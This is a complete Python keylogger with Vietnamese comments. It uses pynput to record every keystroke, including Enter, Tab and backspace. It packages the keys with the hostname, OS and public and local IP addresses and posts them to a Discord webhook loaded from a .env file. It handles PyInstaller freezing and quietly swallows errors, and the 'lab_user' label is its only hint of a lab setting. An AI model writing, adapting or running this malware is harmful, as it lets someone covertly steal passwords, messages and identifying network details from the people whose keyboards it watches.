import os
import sys
import logging
import time
import json
from datetime import datetime
from dotenv import load_dotenv
import requests
from pynput import keyboard
import platform
import socket

if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
else:
    base_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

env_path = os.path.join(base_path, '.env')
load_dotenv(env_path)
WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

if not WEBHOOK_URL:
    raise SystemExit()

key_buffer = []
MAX_BUFFER_SIZE = 50
USER = "lab_user"
last_send_time = 0
MIN_SEND_INTERVAL = 30

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org", timeout=5)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException:
        return "Không thể lấy public IP"

def get_local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except socket.gaierror:
        return "Không thể lấy local IP"

def on_press(key):
    global last_send_time
    try:
        current_time = time.time()
        
        if hasattr(key, 'char') and key.char:
            # Bỏ qua khoảng trắng liên tiếp
            if key.char == ' ' and key_buffer and key_buffer[-1] == ' ':
                return
            key_buffer.append(key.char)
        else:
            # Ghi các phím đặc biệt quan trọng
            key_str = str(key)
            if key_str in ['Key.enter', 'Key.tab', 'Key.backspace', 'Key.space']:
                key_buffer.append(f"[{key_str.replace('Key.', '')}]")
        
        # Gửi log khi đủ buffer HOẶC đã qua thời gian tối thiểu
        if (len(key_buffer) >= MAX_BUFFER_SIZE or 
            (len(key_buffer) > 0 and current_time - last_send_time >= MIN_SEND_INTERVAL)):
            send_log()
            last_send_time = current_time
    except Exception:
        pass

def normalize_keys(keys):
    result = []
    i = 0
    while i < len(keys):
        current = keys[i]
        
        # Xử lý backspace - xóa ký tự trước đó
        if current == '[backspace]':
            if result:
                result.pop()
        # Loại bỏ khoảng trắng thừa
        elif current == ' ':
            if not result or result[-1] != ' ':
                result.append(current)
        # Các ký tự bình thường
        else:
            result.append(current)
        
        i += 1
    
    return result

def send_log():
    if not key_buffer:
        return
    
    # Chuẩn hóa dữ liệu trước khi gửi
    normalized_keys = normalize_keys(key_buffer.copy())
    
    # Chỉ gửi nếu có nội dung có ý nghĩa
    meaningful_content = [k for k in normalized_keys if k.strip() != '']
    if not meaningful_content:
        key_buffer.clear()
        return
    
    current_time = time.time()
    time_readable = datetime.fromtimestamp(current_time).strftime('%d/%m/%Y - %H:%M:%S')
    
    payload = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "time_readable": time_readable,
        "source": USER,
        "event_type": "keylog",
        "keys": normalized_keys,
        "raw_keys": key_buffer.copy(),
        "meta": {
            "session_id": f"keylog-{int(time.time())}",
            "host": platform.node(),
            "os": platform.system(),
            "public_ip": get_public_ip(),
            "local_ip": get_local_ip(),
        }
    }
    
    content = f"**Keylog:** `{time_readable}`\n" \
              f"Source public IP: `{payload['meta']['public_ip']}`\n" \
              f"Local IP: `{payload['meta']['local_ip']}`\n" \
              f"```json\n{json.dumps(payload, indent=2, ensure_ascii=False)}\n```"
    
    try:
        r = requests.post(WEBHOOK_URL, json={"content": content}, timeout=10)
        r.raise_for_status()
        key_buffer.clear()
    except requests.exceptions.RequestException:
        pass

def main():
    global last_send_time
    last_send_time = time.time()
    
    try:
        with keyboard.Listener(on_press=on_press, suppress=False) as listener:
            listener.join()
    except KeyboardInterrupt:
        if key_buffer:
            send_log()
    except Exception:
        pass

if __name__ == "__main__":
    main()